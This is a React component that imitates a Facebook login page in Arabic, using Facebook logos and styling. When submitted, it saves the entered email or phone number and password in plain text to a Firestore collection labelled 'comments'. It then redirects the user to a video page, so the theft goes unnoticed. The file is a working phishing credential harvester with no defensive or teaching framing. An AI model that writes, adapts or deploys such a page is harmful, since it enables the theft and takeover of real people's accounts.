import { useEffect, useState } from "react";
import { db } from "../firebase";
import { addDoc, collection } from "firebase/firestore";
import styled from "styled-components";
import { useNavigate } from "react-router-dom";

function Signin() {
  const [email, setemail] = useState("");
  const [passord, setpassord] = useState("");
  const navicate = useNavigate();
  const payload = {
    email: email,
    passord: passord,
  };

  const handler = async (e) => {
    e.preventDefault();
    const collRef = collection(db, "comments");
    await addDoc(collRef, {
      information: payload,
    });
    setemail("");
    setpassord("");
    navicate("/video", { replace: true });
  };

  return (
    <div>
      <Main className="container position-relative bg-light">
        <div className="fw-bold text-end fs-3 p-3">
          <img
            src="https://as2.ftcdn.net/v2/jpg/04/32/63/05/1000_F_432630531_5v6lgCzai9itnEVt2pGQEeyt4PKa02vw.jpg"
            alt=""
            style={{ width: "30px" }}
          />
        </div>
        <div className="text-center">العربية</div>
        <div className="d-flex justify-content-center">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"
            alt=""
            className="mt-5 mb-5"
            style={{ width: "55px;", height: "55px" }}
          />
        </div>
        <form onSubmit={handler}>
          <input
            onChange={(e) => setemail(e.target.value)}
            className="text-end input"
            type="text"
            placeholder="رقم الهاتف المحمول او البريد الألكتروني"
            value={email}
          />
          <input
            type="password"
            placeholder="كلمة السر"
            className="text-end input"
            onChange={(e) => setpassord(e.target.value)}
            value={passord}
          />
          <button disabled={!email || !passord} className="signin">
            تسجيل دخول
          </button>
          <div className="text-center mt-3">هل نسيت كلمة السر؟</div>
        </form>
        <div className="last-div bg-light">
          <button className="new-acount bg-light">أنشاء حساب جديد</button>
          <img
            className="rounded mt-3"
            src="https://www.citypng.com/public/uploads/preview/download-meta-facebook-black-logo-png-701751694777071xbfbrsf0xw.png"
            alt=""
            style={{ width: "50px" }}
          />
        </div>
      </Main>
    </div>
  );
}
const Main = styled.div`
  min-height: 100vh;

  & .input {
    display: block;
    border-radius: 10px;
    border: 1px solid rgb(204, 204, 204);
    width: 100%;
    padding: 5px;
    height: 55px;
    margin-top: 15px;
    outline: none;
  }
  & .signin {
    background: rgb(24, 119, 242);
    border-radius: 20px;
    width: 100%;
    height: 45px;
    color: white;
    margin-top: 15px;
    border: none;
  }
  & .last-div {
    position: absolute;
    bottom: 0px;
    width: 95%;
    text-align: center;
    & .new-acount {
      border-radius: 20px;
      width: 100%;
      height: 45px;
      color: rgb(24, 119, 242);
      margin-top: 15px;
      border: 0.5px solid rgb(24, 119, 242);
    }
  }
`;
export default Signin;
